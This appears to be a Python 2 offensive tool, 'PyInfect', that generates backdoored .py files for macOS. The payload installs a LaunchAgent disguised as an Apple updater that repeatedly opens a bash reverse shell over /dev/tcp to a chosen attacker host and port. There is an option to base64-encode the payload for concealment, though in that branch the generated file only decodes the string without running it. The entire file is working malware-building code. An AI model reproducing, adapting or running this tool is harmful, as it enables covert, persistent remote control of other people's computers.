import base64
import os
import sys
import socket

try:
    RED = '\033[1;91m'
    UNDERLINE_GREEN = '\033[4;92m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[1;33m'
    WHITE = '\033[0;97m'
    WHITEBU = '\033[1;4m'
    CYAN = '\033[0;36m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    
    NES = '\033[4;32m'+"NES"+WHITE+"> "
    print WHITE
    print YELLOW+"  _____       ",; sys.stdout.softspace=False;print RED+" _____        __          _   "
    print YELLOW+" |  __ \      ",; sys.stdout.softspace=False;print RED+"|_   _|      / _|        | |  "
    print YELLOW+" | |__) |   _ ",; sys.stdout.softspace=False;print RED+"  | |  _ __ | |_ ___  ___| |_ "
    print YELLOW+" |  ___/ | | |",; sys.stdout.softspace=False;print RED+"  | | | '_ \|  _/ _ \/ __| __|"
    print YELLOW+" | |   | |_| |",; sys.stdout.softspace=False;print RED+" _| |_| | | | ||  __/ (__| |_ "
    print YELLOW+" |_|    \__, |",; sys.stdout.softspace=False;print RED+"|_____|_| |_|_| \___|\___|\__|"
    print YELLOW+"         __/ |"
    print YELLOW+"        |___/  "
    print ""
    print RED+'Backdoor '+GREEN+'any '+YELLOW+'.py '+GREEN+'file'+BLUE+' //'+GREEN+' Backdoor implanter for '+CYAN+'OS X'+GREEN+' - Compatible with '+MAGENTA+'EggShell'+GREEN+'!'+WHITE+'\n'
                              
    def getip():
    	try:
    		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    		s.connect(("192.168.1.1",80))
    		host = s.getsockname()[0];s.close()
    		return host
    	except:
    		return "127.0.0.1"
    
    lhost = getip()
    lport = "4444"
    
    hostChoice = raw_input(CYAN+"Set LHOST (Leave blank for "+lhost+"): "+GREEN)
    if hostChoice == "":
    	hostChoice = lhost
    portChoice = raw_input(CYAN+"Set LPORT (Leave blank for "+str(lport)+"): "+GREEN)
    if portChoice == "":
    	portChoice = lport
    print ""
    interval = raw_input(CYAN+"Persistence Interval (Leave blank for 60sec) [1-86400]: "+GREEN)
    if interval == "":
    	interval = "60"
    print ""
    filename = raw_input(CYAN+"Filename (example.py): "+GREEN)
    
    if ".py" not in filename:
    	filename = filename + ".py"
    
    encode = raw_input(CYAN+"Encode to Base64? [Y/N]: "+GREEN)
    print ""

    yes = ['Y', 'y', 'Ye', 'ye', 'YE', 'Yes', 'yes', 'YES']
    no = ['N', 'n', 'No', 'no', 'NO']
    
    command = '''mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.zerowidth.launched.appleupdater</string>
        <key>ProgramArguments</key>
        <array>
            <string>sh</string>
            <string>-c</string>
            <string>bash &amp;&gt; /dev/tcp/'''+hostChoice+'''/'''+portChoice+''' 0&gt;&amp;1</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>StartInterval</key>
        <integer>'''+interval+'''.0</integer>
    </dict>
    </plist>
    
    " >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true'''
    
    if encode in yes:
    	encoded = base64.b64encode(command)
    	
    	file = open(filename,"w")
    	file.write('import os\n')
    	file.write('import sys\n\n')
    	file.write('os.system("echo '+encoded+' | base64 -D")\n')
    	file.close()
    
    elif encode in no:
    	file = open(filename,"w")
    	file.write('import os\n')
    	file.write('import sys\n\n')
    	file.write('os.system("""'+command+'""")')
    	file.close()
    
    else:
    	print RED+"Error: Invalid choice."+WHITE
    	os._exit(1)
    
    print GREEN+"Backdoor implanted successfully - Saved as "+MAGENTA+filename+WHITE

except KeyboardInterrupt:
	print RED+"\nExiting..."+WHITE

except:
	print RED+"\nAn error has occured. Exiting..."+WHITE